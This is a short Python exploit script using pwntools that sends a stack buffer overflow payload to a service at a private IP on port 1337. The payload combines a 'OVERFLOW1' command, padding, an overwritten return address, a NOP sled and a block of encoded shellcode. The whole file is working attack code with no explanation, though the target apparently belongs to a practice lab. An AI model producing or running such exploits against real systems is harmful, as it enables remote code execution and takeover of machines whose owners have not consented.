#!/usr/bin/env python3
from pwn import *

host = "10.10.26.45"
port = 1337
s = remote(host, port)
total_length = 3000
offset = 1978
new_eip = p32(0x62501203)
nop = b"\x90" * 10

buf =  b""
buf += b"\xdb\xc8\xba\x10\x83\xd9\x3f\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x59\x31\x57\x19\x83\xef\xfc\x03\x57\x15\xf2"
buf += b"\x76\x25\xd7\x7d\x78\xd6\x28\xe1\x48\x04\xa1\x04\xce"
buf += b"\x23\xe0\xf6\x84\x66\x09\x7d\xc8\x92\x1e\x36\xa7\xbc"
buf += b"\x11\xc7\xb3\xb3\x79\x06\x04\x9f\x46\x09\xf8\xe2\x9a"
buf += b"\xe9\xc1\x2c\xef\xe8\x06\xfb\x85\x05\xda\xab\xee\x8b"
buf += b"\xcb\xd8\xb3\x17\xed\x0e\xb8\x27\x95\x2b\x7f\xd3\x29"
buf += b"\x35\x50\x90\xea\x15\xdb\xee\x12\x06\xda\x3d\xa7\x6f"
buf += b"\xa8\xfd\x99\x90\x18\x76\xed\xe5\x9a\x5e\x3f\x3a\x30"
buf += b"\x9f\x8f\xb7\x48\xd8\x28\x28\x3f\x12\x4b\xd5\x38\xe1"
buf += b"\x31\x01\xcc\xf5\x92\xc2\x76\xd1\x23\x06\xe0\x92\x28"
buf += b"\xe3\x66\xfc\x2c\xf2\xab\x77\x48\x7f\x4a\x57\xd8\x3b"
buf += b"\x69\x73\x80\x98\x10\x22\x6c\x4e\x2c\x34\xc8\x2f\x88"
buf += b"\x3f\xfb\x26\xac\xc0\x03\x47\xf0\x56\xcf\x8a\x0b\xa6"
buf += b"\x47\x9c\x78\x94\xc8\x36\x17\x94\x81\x90\xe0\xad\x86"
buf += b"\x22\x3e\x15\xc6\xdc\xbf\x65\xce\x1a\xeb\x35\x78\x8a"
buf += b"\x94\xde\x78\x33\x41\x4a\x73\xa3\x60\x9b\x88\x2f\x1d"
buf += b"\x99\x8e\x6c\xf4\x14\x68\x22\x56\x76\x25\x83\x06\x36"
buf += b"\x95\x6b\x4d\xb9\xca\x8c\x6e\x10\x63\x26\x81\xcc\xdb"
buf += b"\xdf\x38\x55\x97\x7e\xc4\x40\xdd\x41\x4e\x60\x21\x0f"
buf += b"\xa7\x01\x31\x78\xd0\xe9\xc9\x79\x75\xe9\xa3\x7d\xdf"
buf += b"\xbe\x5b\x7c\x06\x88\xc3\x7f\x6d\x8b\x04\x7f\xf0\xbd"
buf += b"\x7f\xb6\x66\x81\x17\xb7\x66\x01\xe8\xe1\xec\x01\x80"
buf += b"\x55\x55\x52\xb5\x99\x40\xc7\x66\x0c\x6b\xb1\xdb\x87"
buf += b"\x03\x3f\x05\xef\x8b\xc0\x60\x73\xcb\x3e\xf6\x5c\x74"
buf += b"\x56\x08\xdd\x84\xa6\x62\xdd\xd4\xce\x79\xf2\xdb\x3e"
buf += b"\x81\xd9\xb3\x56\x08\x8c\x76\xc7\x0d\x85\xd7\x59\x0d"
buf += b"\x2a\xcc\x6a\x74\x43\xf3\x8b\x89\x4d\x90\x8c\x89\x71"
buf += b"\xa6\xb1\x5f\x48\xdc\xf4\x63\xef\xef\x43\xc1\x46\x7a"
buf += b"\xab\x55\x98\xaf"

shell = buf


payload = [
    b"OVERFLOW1 ",
    b"A" * offset,
    new_eip,
    nop,
    shell,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(shell)),
]

payload = b"".join(payload)
s.send(payload)
s.close()